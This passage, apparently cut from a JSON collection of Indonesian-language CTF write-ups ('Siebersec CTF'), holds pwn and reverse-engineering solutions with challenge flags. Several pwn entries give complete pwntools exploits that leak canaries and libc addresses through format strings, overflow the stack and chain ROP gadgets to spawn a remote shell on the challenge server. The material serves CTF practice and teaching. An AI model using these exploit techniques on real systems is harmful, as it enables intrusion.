fgets\ncall sym.imp.fgets\n```\nInstruksi `movzx` mengubah nilai `-1` menjadi `65535`. Karena kapasitas buffer `s` di stack hanya dialokasikan sebesar 88 byte (dari alamat `rbp-0x60` ke posisi Canary di `rbp-0x8`), batas baca `65535` byte dari `fgets` memberikan kita celah Stack-based Buffer Overflow yang sangat besar untuk mengontrol Return Address (RIP)."
      },
      {
        "title": "3. Strategi Eksploitasi (Exploit Strategy)",
        "content": "**Langkah 1: Membocorkan Canary & Alamat Libc**\n- Jarak dari format ke Canary (`rbp-0x8`) adalah $0\\text{xa0} - 0\\text{x8} = 0\\text{x98}$ byte (152 desimal), yang setara dengan 19 slot stack 64-bit. Posisi Canary berada tepat pada indeks format string `%27$p`.\n- Posisi Return Address utama berada tepat pada indeks format string `%29$p`.\n- Jarak konstan (offset) dari alamat leak indeks 29 ke Libc Base pada biner `libc.so.6` (GLIBC 2.39) adalah `0x2a578`.\n\n**Langkah 2: Penanganan Badchar (\\x0a)**\nFungsi `fgets` berhenti membaca input jika mendeteksi byte Newline (`\\x0a`). Karena ASLR mengacak memori, ada kemungkinan alamat Canary atau Libc mengandung byte `0x0a` secara acak. Skrip eksploitasi melakukan looping connection secara otomatis sampai mendapatkan alamat yang bersih dari badchar `\\x0a`.\n\n**Langkah 3: ROP Chain & Penyelarasan Stack (MOVAPS Fix)**\n- Isi buffer `s` dengan padding sampah sebanyak 88 byte.\n- Masukkan nilai Canary remote yang berhasil dibocorkan.\n- Masukkan dummy data 8 byte untuk menimpa posisi Saved RBP.\n- Masukkan gadget `ret` ekstra untuk meluruskan Stack Alignment kelipatan 16-byte.\n- Masukkan gadget `pop rdi; ret` untuk menyuplai argumen pertama ke fungsi `system`.\n- Masukkan alamat string `\"/bin/sh\"` dan panggil `system()`."
      },
      {
        "title": "4. Kode Eksploitasi Akhir (Python Script)",
        "content": "Berikut adalah kode eksploitasi final menggunakan pustaka pwntools:",
        "code": "from pwn import *\nimport time\n\nelf = ELF('./chal')\nlibc = ELF('./libc.so.6')\ncontext.binary = elf\n\noffset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29\n\nwhile True:\n    try:\n        # Menghubungkan ke server tantangan remote\n        p = remote('chal.sieberr.live', 21003)\n        \n        # 1. Bocorkan Canary & Alamat Libc Remote\n        p.sendlineafter(b\"What is your name?\", b\"%27$p %29$p\")\n        p.recvuntil(b\"Welcome, \")\n        leak_data = p.recvline().strip().split()\n        \n        canary = int(leak_data[0], 16)\n        leak_libc = int(leak_data[1], 16)\n        libc.address = leak_libc - offset_libc\n        \n        # 2. Ambil Gadget ROP dari Libc terhitung\n        rop = ROP(libc)\n        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n        ret = rop.find_gadget(['ret'])[0]\n        bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\n        system_addr = libc.symbols['system']\n        \n        # Saringan Badchar \\x0a (Memastikan payload tidak terpotong prematur oleh fgets)\n        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\n        if b'\\x0a' in check_bytes:\n            p.close()\n            continue\n            \n        log.success(f\"Libc Base Remote Sukses: {hex(libc.address)}\")\n        log.success(f\"Canary Remote Sukses: {hex(canary)}\")\n        \n        # 3. Strukturisasi Payload ROP (Padding Buffer: 88 byte)\n        payload = b\"A\" * 88\n        payload += p64(canary)\n        payload += b\"B\" * 8          # Saved RBP\n        payload += p64(ret)          # Penyelaras Stack 16-byte (MOVAPS Fix)\n        payload += p64(pop_rdi)       # Konfigurasi parameter fungsi\n        payload += p64(bin_sh)        # RDI = Alamat \"/bin/sh\"\n        payload += p64(system_addr)  # Panggil system()\n        \n        # 4. Kirim serangan pemicu Integer Underflow\n        p.sendlineafter(b\"How much space do you want?\", b\"-1\")\n        p.sendline(payload)          \n        \n        # Berikan jeda transmisi soket agar proses perpindahan ke /bin/sh stabil\n        time.sleep(0.5)\n        p.clean(timeout=0.5)\n        \n        log.info(\"Membuka interaksi Shell...\")\n        p.interactive()\n        break\n        \n    except Exception:\n        try: p.close()\n        except: pass"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "from pwn import *\r\nimport time\r\n\r\nelf = ELF('./chal')\r\nlibc = ELF('./libc.so.6')\r\ncontext.binary = elf\r\n\r\noffset_libc = 0x2a578  # Offset presisi GLIBC 2.39 indeks 29\r\n\r\nwhile True:\r\n    try:\r\n        p = remote('chal.sieberr.live', 21003)\r\n        \r\n        # 1. Leak Canary & Libc Remote\r\n        p.sendlineafter(b\"What is your name?\", b\"%27$p %29$p\")\r\n        p.recvuntil(b\"Welcome, \")\r\n        leak_data = p.recvline().strip().split()\r\n        \r\n        canary = int(leak_data[0], 16)\r\n        leak_libc = int(leak_data[1], 16)\r\n        libc.address = leak_libc - offset_libc\r\n        \r\n        # 2. Ambil Gadget ROP\r\n        rop = ROP(libc)\r\n        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\r\n        ret = rop.find_gadget(['ret'])[0]\r\n        bin_sh = next(libc.search(b\"/bin/sh\\x00\"))\r\n        system_addr = libc.symbols['system']\r\n        \r\n        # Saringan Badchar \\x0a (Newline pembunuh fgets)\r\n        check_bytes = p64(canary) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\r\n        if b'\\x0a' in check_bytes:\r\n            p.close()\r\n            continue\r\n            \r\n        log.success(f\"Libc Base Remote Sukses: {hex(libc.address)}\")\r\n        log.success(f\"Canary Remote Sukses: {hex(canary)}\")\r\n        \r\n        # 3. Susun Payload Utama (Padding: 88 byte)\r\n        payload = b\"A\" * 88\r\n        payload += p64(canary)\r\n        payload += b\"B\" * 8          # Saved RBP\r\n        payload += p64(ret)          # Stack Alignment (MOVAPS Fix)\r\n        payload += p64(pop_rdi)\r\n        payload += p64(bin_sh)\r\n        payload += p64(system_addr)\r\n        \r\n        # 4. Kirim Serangan secara hati-hati\r\n        p.sendlineafter(b\"How much space do you want?\", b\"-1\")\r\n        \r\n        # Kirim payload dan berikan jeda micro-second agar server memproses stack frame\r\n        p.sendline(payload)\r\n        time.sleep(0.5)\r\n        \r\n        # Bersihkan sisa output buffer sebelum masuk mode interaktif\r\n        p.clean(timeout=0.5)\r\n        \r\n        log.info(\"Membuka interaksi Shell... Ketik 'cat flag.txt'\")\r\n        p.interactive()\r\n        break\r\n        \r\n    except Exception:\r\n        try: p.close()\r\n        except: pass"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{C4tS_L0ve_pl4y1Ng_1n_tHe_suN}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-pwn-lotus",
    "title": "Lotus",
    "ctfName": "Siebersec CTF",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "if after running `pwninit` your patched binary cannot run, try doing `patchelf --force-rpath --set-rpath '.' <patched binary name>`",
    "problemDescription": "if after running `pwninit` your patched binary cannot run, try doing `patchelf --force-rpath --set-rpath '.' <patched binary name>`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (exploit.py):",
        "code": "from pwn import *\r\n\r\n# Context\r\ncontext.arch = 'amd64'\r\n\r\ndef solve():\r\n    # p = process(['/home/nata/ctf/SiebersecCTF/pwn/lotus/solve'])\r\n    p = remote('chal.sieberr.live', 21005)\r\n\r\n    n = 105\r\n    m = 105\r\n    p.sendline(f\"{n} {m}\")\r\n    a = [1] * 105\r\n    p.sendline(\" \".join(map(str, a)))\r\n    p.sendline(\"1000\") \r\n\r\n    def leak_val(idx, base_idx):\r\n        current_p = 0\r\n        val = 0\r\n        for i in range(47, -1, -1):\r\n            bit_val = 1 << i\r\n            p.sendline(f\"1 {base_idx} {bit_val}\")\r\n            current_p += bit_val\r\n            p.sendline(f\"3 {idx} {base_idx}\")\r\n            try:\r\n                res = p.recvline().strip()\r\n                if res == b'1':\r\n                    val = current_p\r\n                else:\r\n                    p.sendline(f\"2 {base_idx}\")\r\n                    current_p -= bit_val\r\n            except EOFError:\r\n                break\r\n        return val\r\n\r\n    print(\"Leaking ROP values...\")\r\n    val_221 = leak_val(221, 50)\r\n    val_222 = leak_val(222, 51)\r\n    val_223 = leak_val(223, 52)\r\n    val_224 = leak_val(224, 53)\r\n    \r\n    libc_base = val_221 - 0x2a578\r\n    print(f\"Libc: {hex(libc_base)}\")\r\n    libc = ELF('/home/nata/ctf/SiebersecCTF/pwn/lotus/libc.so.6')\r\n    libc.address = libc_base\r\n    \r\n    pop_rdi = libc_base + 0x119e9c\r\n    bin_sh = next(libc.search(b\"/bin/sh\"))\r\n    system = libc.symbols['system']\r\n    ret = libc_base + 0x119e9d\r\n    \r\n    # We want: \r\n    # 221 -> ret\r\n    # 222 -> pop_rdi\r\n    # 223 -> bin_sh\r\n    # 224 -> system\r\n    \r\n    # Actually wait. `p[x] += diff`\r\n    def set_val(idx, target, current):\r\n        diff = target - current\r\n        p.sendline(f\"1 {idx} {diff}\")\r\n        \r\n    print(\"Writing ROP chain...\")\r\n    set_val(221, ret, val_221)\r\n    set_val(222, pop_rdi, val_222)\r\n    set_val(223, bin_sh, val_223)\r\n    set_val(224, system, val_224)\r\n    \r\n    print(\"Exiting...\")\r\n    q_val = leak_val(214, 54)\r\n    p.sendline(f\"1 214 {1 - q_val}\")\r\n    \r\n    # Last command\r\n    p.sendline(\"3 0 0\")\r\n    \r\n    p.sendline(\"cat flag.txt\")\r\n    p.interactive()\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-pwn-owowhatthis",
    "title": "SiebersecCTF 2026 - owo what's this? (Pwn)",
    "ctfName": "Siebersec CTF",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge SiebersecCTF 2026 - owo what's this? (Pwn)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Program mengalami kerentanan Stack Buffer Overflow klasik pada fungsi `main` akibat penggunaan fungsi `gets(buf)`. Fungsi `gets` tidak memvalidasi panjang input yang diterima, sehingga input yang melebihi ukuran buffer akan langsung menimpa area memori di atasnya, termasuk Saved RBP dan Return Address (RIP).\n\nHasil pemeriksaan keamanan biner (`checksec`):\n- **Canary**: Disabled (Kondisi ideal untuk mengontrol RIP secara langsung).\n- **PIE**: Disabled (Alamat fungsi di memori bersifat statis/tetap pada basis `0x400000`).\n- **NX**: Enabled (Stack tidak dapat dieksekusi, sehingga harus menggunakan teknik ROP).\n\nBerdasarkan analisis kode assembly di `main`, posisi buffer berada di `rbp-0x10` (16 bytes). Jarak aman untuk menimpa Return Address adalah:\n`16 bytes (buffer) + 8 bytes (saved RBP) = 24 bytes padding.`",
    "solution": [
      {
        "title": "Exploitation Strategy",
        "content": "Tujuan eksploitasi adalah memanggil fungsi `owo_whats_thissssssssssssss` (`0x004011a3`) dengan argumen pertama (`RDI`) bernilai `67416741` (`0x404b2a5`).\n\nLangkah penyusunan ROP Chain:\n1. Isi padding sebanyak 24 byte untuk menjangkau RIP.\n2. Gunakan gadget `ret` (`0x0040119f`) untuk menyelaraskan stack pointer (Stack Alignment 16-byte) agar fungsi `printf` pada remote server tidak mengalami crash akibat instruksi `MOVAPS`.\n3. Panggil gadget `pop rdi; ret` (`0x0040119e`) yang berada di dalam fungsi `owo_whats_this`.\n4. Masukkan nilai target `67416741` ke dalam stack agar ter-pop ke register `RDI`.\n5. Arahkan eksekusi ke fungsi `owo_whats_thissssssssssssss`."
      },
      {
        "title": "Exploit Script",
        "content": "```python\nfrom pwn import *\n\np = remote('chal.sieberr.live', 21001)\n\npop_rdi_ret = 0x0040119e \nret_gadget = 0x0040119f   \ntarget_func = 0x004011a3\nargument_sus = 67416741\n\npayload = b\"A\" * 24\npayload += p64(ret_gadget)   \npayload += p64(pop_rdi_ret)\npayload += p64(argument_sus)\npayload += p64(target_func)\n\np.sendlineafter(b\">>> \", payload)\np.interactive()\n\nFlag\nsctf{b0rn_70_h1i1i_:3_f0Rc3d_t0_r3g4rD1Ng_mY_l457_3M4iL}"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "from pwn import *\r\n\r\np = remote('chal.sieberr.live', 21001)\r\n# p = process('./owo')\r\n\r\n# Alamat presisi dari hasil objdump\r\npop_rdi_ret = 0x0040119e \r\nret_gadget = 0x0040119f   # Digunakan untuk Stack Alignment 16-byte\r\ntarget_func = 0x004011a3\r\nargument_sus = 67416741\r\n\r\n# ROP Chain yang sudah diperbaiki alignment-nya\r\npayload = b\"A\" * 24\r\npayload += p64(ret_gadget)   # <--- Penyelamat dari MOVAPS crash\r\npayload += p64(pop_rdi_ret)\r\npayload += p64(argument_sus)\r\npayload += p64(target_func)\r\n\r\nlog.info(\"Mengirimkan ROP Chain dengan Stack Alignment Fix...\")\r\np.sendlineafter(b\">>> \", payload)\r\np.interactive()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-rev-flagchecker3002",
    "title": "flagchecker3002",
    "ctfName": "Siebersec CTF",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini adalah sebuah file Python bytecode (`chall.pyc`) yang dikompilasi untuk Python 3.12.",
    "problemDescription": "Challenge ini adalah sebuah file Python bytecode (`chall.pyc`) yang dikompilasi untuk Python 3.12.",
    "tools": [],
    "analysis": "Setelah melakukan disassembly menggunakan module `dis` di Python, ditemukan tiga fungsi utama:\n1. `enc(a)`: Fungsi enkripsi awal yang tampak sangat sederhana (hanya XOR dengan key).\n2. `main()`: Fungsi utama yang meminta input flag dan memvalidasinya.\n3. `_()`: Fungsi yang dipanggil sebelum `main()` dan melakukan manipulasi memory menggunakan `ctypes`.\n\nJika kita mencoba menghitung flag secara naif dari fungsi `enc` yang terlihat di disassembly awal, kita akan mendapatkan:\n`sctf{this_is_not_the_real_flag!!}`.",
    "solution": [
      {
        "title": "Self-Modifying Bytecode",
        "content": "Fungsi `_()` sebenarnya adalah fungsi yang memodifikasi bytecode fungsi `enc` saat runtime. Fungsi ini memiliki beberapa instruksi `JUMP_FORWARD` yang sangat jauh (ke offset 65036) sebagai teknik obfuscation untuk mencegah disassembly sederhana atau eksekusi normal jika tidak ditangani dengan benar.\n\nSetelah mem-patch bytecode fungsi `_()` untuk melewati jump-jump tersebut dan menjalankannya, kita dapat melihat perubahan pada bytecode fungsi `enc` di memory."
      },
      {
        "title": "Reversing Logic",
        "content": "Bytecode `enc` yang baru memiliki logika sebagai berikut:\n1. Mengambil input `c` dan key `k`.\n2. Melakukan operasi `temp = (c + k) % 255`.\n3. Melakukan XOR antara `temp` dengan sebuah magic sequence: `b'\\x0e\\xc0\\xe0\\xcd\\xf7\\xe0\\x80\\xff\\xc9\\xf1\\x08\\xff7\\xfe\\xe1\\xc3\\xb0\\x02\\x8f\\xc5\\xf8\\xdc\\t\\x81\\xe7\\xc0\\xd7\\xfc\\xf1\\x18\\xb0\\xb2\\xff'`.\n4. Membandingkan hasilnya dengan `target`.\n\nPersamaan enkripsinya:\n`target[i] = ((input[i] + key[i]) % 255 ^ magic[i]) & 255`\n\nUntuk mendapatkan flag:\n`input[i] = ((target[i] ^ magic[i]) - key[i]) % 255`"
      },
      {
        "title": "Solusi",
        "content": "Script `solve.py` melakukan perhitungan kebalikan dari logika enkripsi yang ditemukan di memory.\n\n\n\nFlag: `sctf{three_thousand_and_twoooooo}`",
        "code": "key = b'\\x07<q\\xa6\\xdb\\x10Ez\\xaf\\xe4\\x19N\\x83\\xb8\\xed\"W\\x8c\\xc1\\xf6+`\\x95\\xca\\xff4i\\x9e\\xd3\\x08=r\\xa7'\ntarget = b't_\\x05\\xc0\\xa0d-\\x13\\xdc\\xbbp=\\xdc\\xd6\\x82V\\x08\\xf8\\xa9\\x93t\\x12\\xf0\\xab\\x93k\\x0f\\xf2\\xb2o\\x1cS\\xda'\nmagic = b'\\x0e\\xc0\\xe0\\xcd\\xf7\\xe0\\x80\\xff\\xc9\\xf1\\x08\\xff7\\xfe\\xe1\\xc3\\xb0\\x02\\x8f\\xc5\\xf8\\xdc\\t\\x81\\xe7\\xc0\\xd7\\xfc\\xf1\\x18\\xb0\\xb2\\xff'\n\nflag = []\nfor i in range(len(target)):\n    temp = target[i] ^ magic[i]\n    c = (temp - key[i]) % 255\n    flag.append(c)\n\nprint(\"\".join(chr(x) for x in flag))"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{this_is_not_the_real_flag!!}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-rev-flagchecker67",
    "title": "flagchecker6767",
    "ctfName": "Siebersec CTF",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Challenge ini adalah sebuah reverse engineering berbasis maze traversal.",
    "problemDescription": "Challenge ini adalah sebuah reverse engineering berbasis maze traversal. Kita diberikan sebuah script Python `chall.py` dan sebuah file teks `sixseven.txt` yang berisi grid karakter '6' dan '7'.",
    "tools": [],
    "analysis": "Di dalam `chall.py`, terdapat logika untuk mengacak sebuah list karakter (`seven`) berdasarkan seed tertentu (`67`). Karakter-karakter ini dipetakan ke jarak pergerakan di dalam maze.\n- `six = \"sctf{sixsevenSIXSEVEN6767}\"`\n- `seven` adalah list karakter unik dari `six` yang di-shuffle.\n- Maze dimulai dari koordinat `(1, 1)` dan target akhirnya adalah `(247, 219)`.\n- Pergerakan bergantian antara Horizontal dan Vertical.\n- Jarak pergerakan ditentukan oleh index karakter input di dalam list `seven` + 1.\n- Karakter '7' di dalam grid `sixseven.txt` berfungsi sebagai tembok. Jika koordinat perantara (antara titik awal dan akhir pergerakan) adalah '7', maka input dianggap salah.",
    "solution": [
      {
        "title": "Solusi",
        "content": "Karena ini adalah masalah pencarian jalur di dalam maze dengan batasan pergerakan (alternating horizontal/vertical), kita bisa menggunakan algoritma Breadth-First Search (BFS).\n\nLangkah-langkah:\n1. Rekonstruksi list `seven` yang digunakan oleh script.\n2. Load grid dari `sixseven.txt`.\n3. Gunakan BFS dengan state `(x, y, is_horizontal)` untuk mencari jalur terpendek dari `(1, 1)` ke `(247, 219)`.\n4. Setiap langkah di BFS mencoba semua kemungkinan karakter dari `seven` (jarak 1-19).\n5. Gabungkan karakter-karakter yang membentuk jalur tersebut menjadi flag.\n\nSetelah menjalankan solver, kita mendapatkan flag: `sctf{sIXxX67SevEnNn6767}`.\n\nValidasi:\n\n\nFlag: `<FLAG>sctf{sIXxX67SevEnNn6767}</FLAG>`",
        "code": "echo \"sctf{sIXxX67SevEnNn6767}\" | python3 chall.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import random\r\nfrom collections import deque\r\n\r\nsix = \"sctf{sixsevenSIXSEVEN6767}\"\r\nseven = sorted(set(six))\r\nrandom.seed(67)\r\nrandom.shuffle(seven)\r\n\r\ndef solve():\r\n    with open(\"sixseven.txt\") as f:\r\n        grid = [line.strip() for line in f if line.strip()]\r\n\r\n    target_x, target_y = 247, 219\r\n    start_x, start_y = 1, 1\r\n\r\n    # queue: (x, y, is_horizontal, path)\r\n    queue = deque([(start_x, start_y, True, \"\")])\r\n    visited = set([(start_x, start_y, True)])\r\n\r\n    while queue:\r\n        x, y, is_horizontal, path = queue.popleft()\r\n\r\n        if x == target_x and y == target_y:\r\n            print(f\"<FLAG>{path}</FLAG>\")\r\n            return\r\n\r\n        for dist_minus_1, char in enumerate(seven):\r\n            dist = dist_minus_1 + 1\r\n            new_x, new_y = x, y\r\n            possible = True\r\n            \r\n            if is_horizontal:\r\n                for _ in range(dist):\r\n                    if new_x + 1 >= len(grid[0]) or grid[new_y][new_x + 1] == '7':\r\n                        possible = False\r\n                        break\r\n                    new_x += 2\r\n            else:\r\n                for _ in range(dist):\r\n                    if new_y + 1 >= len(grid) or grid[new_y + 1][new_x] == '7':\r\n                        possible = False\r\n                        break\r\n                    new_y += 2\r\n\r\n            if possible:\r\n                if (new_x, new_y, not is_horizontal) not in visited:\r\n                    visited.add((new_x, new_y, not is_horizontal))\r\n                    queue.append((new_x, new_y, not is_horizontal, path + char))\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "sctf{sixsevenSIXSEVEN6767}",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-rev-littlebabyfirstrev",
    "title": "SiebersecCTF - littleBabyFirstRev (Reverse Engineering)",
    "ctfName": "Siebersec CTF",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge SiebersecCTF - littleBabyFirstRev (Reverse Engineering)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Diberikan sebuah script Python `chall.py`. Di dalamnya terdapat fungsi `check_flag()` yang menyimpan 7 buah array berisi data biner (`a` sampai `g`). \n\nScript ini melakukan rekonstruksi karakter flag dengan cara melakukan operasi *bit shifting* ke kiri (`<<`) pada setiap elemen array berdasarkan indeksnya, lalu menjumlahkannya (`+`). Hasil penjumlahan tersebut dikonversi menjadi karakter ASCII menggunakan fungsi `chr()`.\n\nVulnerability atau celah keamanan tidak ada karena ini adalah tantangan *Reverse Engineering* dasar. Logika pembuatan flag sudah tertanam langsung (hardcoded) di dalam source code, sehingga kita hanya perlu mengekstrak dan mengeksekusi logika rekonstruksi tersebut tanpa harus memberikan input yang valid ke program aslinya.",
    "solution": [
      {
        "title": "Langkah Penyelesaian",
        "content": "1. Ambil seluruh array biner (`a` sampai `g`) beserta loop rekonstruksi dari `chall.py`.\n2. Buat script baru `solve.py` untuk mengisolasi logika tersebut dan langsung mencetak variabel `flag`.\n3. Jalankan script solver untuk mendapatkan flag."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "a = [1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1]\r\nb = [1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0]\r\nc = [0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1]\r\nd = [0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]\r\ne = [1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1]\r\nf = [1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1]\r\ng = [1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1]\r\nflag = \"\"\r\nfor i in range(len(a)):\r\n    n = 0\r\n    n+=a[i]<<0\r\n    n+=b[i]<<1\r\n    n+=c[i]<<2\r\n    n+=d[i]<<3\r\n    n+=e[i]<<4\r\n    n+=f[i]<<5\r\n    n+=g[i]<<6\r\n    flag+=chr(n)\r\nprint(\"FLAG:\", flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-rev-studytime",
    "title": "SiebersecCTF - Study Time (Reverse Engineering)",
    "ctfName": "Siebersec CTF",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Writeup for challenge SiebersecCTF - Study Time (Reverse Engineering)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Diberikan sebuah script Python `homework.py` yang meminta input string sepanjang 50 karakter. Script ini mengambil data teks mentah dari API publik `https://catfact.ninja/breeds` sebagai string referensi. \n\nMelalui struktur percabangan `if` yang sangat dalam (nested), program mencocokkan setiap posisi indeks pada input user dengan posisi indeks tertentu pada string referensi dari API tersebut. Jika seluruh 50 karakter cocok, program akan mengembalikan nilai `True` yang berarti input tersebut adalah flag yang valid.\n\nKarena data referensi bersifat statis (respons API dapat diprediksi/direplikasi) dan aturan pemetaan indeks (`answer[i] == data[j]`) ditulis secara eksplisit di kode, tantangan ini dapat diselesaikan dengan memetakan ulang seluruh indeks tersebut ke dalam sebuah array baru tanpa perlu menebak input secara manual.",
    "solution": [
      {
        "title": "Langkah Penyelesaian",
        "content": "1. Kumpulkan semua pasangan indeks antara input (`answer`) dan string referensi (`my_homework...`) dari file `homework.py`.\n2. Buat script otomasi `solve.py` yang melakukan request ke endpoint API yang sama.\n3. Definisikan dictionary pemetaan indeks dan rekonstruksi string flag berukuran 50 karakter dari karakter-karakter respons API yang sesuai.\n4. Jalankan script untuk mencetak flag."
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "import requests\r\n\r\n# Ambil teks referensi dari API yang sama\r\nref = str(requests.get('https://catfact.ninja/breeds').text)\r\n\r\n# Inisialisasi array dengan 50 karakter kosong\r\nanswer = [\"?\"] * 50\r\n\r\n# Mapping indeks yang diambil dari homework.py\r\nmapping = {\r\n    1: 3190, 19: 2619, 4: 1754, 0: 2583, 17: 3416, 40: 369, 22: 3142, \r\n    5: 243, 31: 3038, 24: 3490, 49: 2809, 7: 3293, 11: 999, 14: 2909, \r\n    26: 2982, 30: 2339, 39: 2339, 3: 1524, 41: 2982, 18: 776, 28: 888, \r\n    21: 1561, 8: 2505, 32: 747, 15: 3614, 43: 3127, 20: 3619, 44: 642, \r\n    48: 2706, 46: 3381, 33: 723, 38: 3369, 23: 1107, 34: 692, 25: 537, \r\n    29: 949, 6: 1208, 10: 2139, 9: 2446, 2: 401, 16: 3025, 12: 1548, \r\n    13: 984, 36: 1544, 35: 3381, 42: 824, 37: 36, 27: 949, 45: 723, 47: 3381\r\n}\r\n\r\n# Isi array answer berdasarkan indeks referensi\r\nfor ans_idx, ref_idx in mapping.items():\r\n    answer[ans_idx] = ref[ref_idx]\r\n\r\nprint(\"FLAG:\", \"\".join(answer))"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": []
  },
  {
    "id": "siebersecctf-rev-turingtraces",
    "title": "Turing Traces",
    "ctfName": "Siebersec CTF",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-22",
    "author": "Nattt",
    "tags": [],
    "description": "Binary ini punya tiga stage terenkripsi di `.text`.",
    "problemDescription": "Binary ini punya tiga stage terenkripsi di `.text`. `main()` nge-`fork()`, child jalan sampai `int3`, lalu parent pakai `ptrace(PTRACE_PEEKDATA/POKEDATA)` buat decrypt blob stage di memori child sebelum dieksekusi.\n\nStage pertama buka `license.key`, baca string hex, lalu parse dengan `strtoull(..., 16)` ke global `0x405100`.\n\nStage kedua bikin nilai turunan:\n\n```c\nv = license ^ 0xbdd640fb06671ad1;\nv *= 0x1c80317fa3b1799d;\nv = rol(v, 17);\nv ^= 0x3eb13b9046685257;\n```\n\nHasilnya disimpan ke `0x405108` dan dibandingkan di stage ketiga dengan konstanta `0xcc4a46bf3e0e326c`.\n\nKarena perkalian dilakukan modulo `2^64` dengan konstanta ganjil, operasi itu invertible. Balik persamaannya:\n\n```text\nlicense = ror((target ^ 0x3eb13b9046685257), 17) * inv(0x1c80317fa3b1799d) ^ 0xbdd640fb06671ad1\nlicense = 0x23b8c1e9392456de\n```\n\nKalau license benar, stage ketiga generate output 64 byte pakai PRNG model `splitmix64`, lalu XOR dengan data di `.rodata`. Hasil stringnya:\n\n```text\nsctf{funding_for_this_program_was_made_possible_by_by_by_by_by}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah singkat",
        "content": "1. Decrypt stage offline dengan ngereplikasi AES-CTR yang dipakai `decrypt_stage`.\n2. Disassemble plaintext stage dan baca logic validasi.\n3. Invers operasi 64-bit di stage dua buat dapat license valid.\n4. Jalankan binary pakai `license.key` itu untuk keluarin flag."
      },
      {
        "title": "Run",
        "content": "Output:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "Script solver lengkap (solve.py):",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\n\r\nMASK = (1 << 64) - 1\r\nC1 = 0xBDD640FB06671AD1\r\nMUL = 0x1C80317FA3B1799D\r\nC2 = 0x3EB13B9046685257\r\nTARGET = 0xCC4A46BF3E0E326C\r\n\r\n\r\ndef rol64(value: int, count: int) -> int:\r\n    return ((value << count) & MASK) | (value >> (64 - count))\r\n\r\n\r\ndef ror64(value: int, count: int) -> int:\r\n    return ((value >> count) | ((value << (64 - count)) & MASK)) & MASK\r\n\r\n\r\ndef recover_license() -> int:\r\n    inv = pow(MUL, -1, 1 << 64)\r\n    value = TARGET ^ C2\r\n    value = ror64(value, 17)\r\n    value = (value * inv) & MASK\r\n    return value ^ C1\r\n\r\n\r\ndef main() -> None:\r\n    root = Path(__file__).resolve().parent\r\n    chall = root / \"chall\"\r\n    license_path = root / \"license.key\"\r\n\r\n    license_value = recover_license()\r\n    license_path.write_text(f\"{license_value:016x}\\n\", encoding=\"ascii\")\r\n    chall.chmod(chall.stat().st_mode | 0o111)\r\n\r\n    proc = subprocess.run(\r\n        [str(chall)],\r\n        